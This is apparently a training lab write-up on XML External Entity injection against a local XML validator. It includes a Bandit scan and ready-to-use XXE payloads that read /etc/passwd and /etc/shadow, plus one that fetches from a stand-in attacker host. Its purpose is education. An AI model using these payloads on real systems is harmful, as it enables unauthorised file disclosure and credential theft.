# External entity attack

An XML External Entity attack is a type of attack against an application that parses XML input. This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser. This attack may lead to the disclosure of confidential data, denial of service, server side request forgery, port scanning from the perspective of the machine where the parser is located, and other system impacts.

Attacks can include disclosing local files, which may contain sensitive data such as passwords or private user data, using file: schemes or relative paths in the system identifier. Since the attack occurs relative to the application processing the XML document, an attacker may use this trusted application to pivot to other internal systems, possibly disclosing other internal content via http(s) requests or launching a CSRF attack to any unprotected internal services. In some situations, an XML processor library that is vulnerable to client-side memory corruption issues may be exploited by dereferencing a malicious URI, possibly allowing arbitrary code execution under the application account. Other attacks can access local resources that may not stop returning data, possibly impacting application availability if too many threads or processes are not released.


### Objective

* Read a local file from the filesystem by means of the XXE injection (such as /etc/passwd)

#### Discovery

We can discover XXE by looking into the application where XML is being parsed.
There are default safe and default unsafe parsers you can find on the web. So it is always
good to do some research about the type of parser before implementation.

First lets try to run a bandit scan against the application source code!

Bandit is a tool designed to find common security issues in Python code. To do this Bandit processes each file, builds an AST from it, and runs appropriate plugins against the AST nodes. Once Bandit has finished scanning all the files it generates a report.

Installing Bandit is as easy as:

```
pip install bandit
# Or if you're working with a Python 3 project
pip3 install bandit
```

And to run we simply do:

```
bandit -r path/to/your/code
```

Let's look at some of the output

```
>> Issue: [B319:blacklist] Using xml.dom.pulldom.parseString to parse untrusted XML data is known to be vulnerable to XML attacks. Replace xml.dom.pulldom.parseString with its defusedxml equivalent function or make sure defusedxml.defuse_stdlib() is called
   Severity: Medium   Confidence: High
   Location: target/project/controllers/Validator.py:15
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b313-b320-xml-bad-pulldom
14	def XML_validator():
15	    doc = parseString(request.form['customers'])
16	    try:
```

Ofcourse we can also discover this vulnerability by try and error.
If we go to the following page we find an "XML validator"

```
http://0.0.0.0:8081/validator
```

To work with the right format we can start by downloading the valid format from 
"Download XML example template" and tinker with this output to form a XXE attack and load
resources from the local web server.

the valid xml output looks as following:

```
<customers>
    <customer> Mr Mario, Bros </customer>
    <customer> Mr Luigi, Bros </customer>
    <customer> Mr Club, Mate </customer>
    <customer> Ms Peach, Princes</customer>
</customers>
```

#### Spoiler 1 - payload examples

payload examples:

```
 <?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [  
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>

 <?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [  
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///etc/shadow" >]><foo>&xxe;</foo>

 <?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [  
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>

 <?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [  
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "http://www.attacker.com/text.txt" >]><foo>&xxe;</foo>
   ```

   As you can see we can load sources from both internal file system as from external sources.
   That can also be very interesting when you want to perfom other sorts of attacks like XSS.

   Now lets refer again to the original XML output and tinker it in a way where it is leveraging
   our attack!

```
 <?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE customer [  
   <!ELEMENT customer ANY >
   <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><customers>
    <customer> sd&xxe; </customer>
    <customer> Mr Luigi, Bros </customer>
    <customer> Mr Club, Mate </customer>
    <customer> Ms Peach, Princes</customer>
</customers>
```


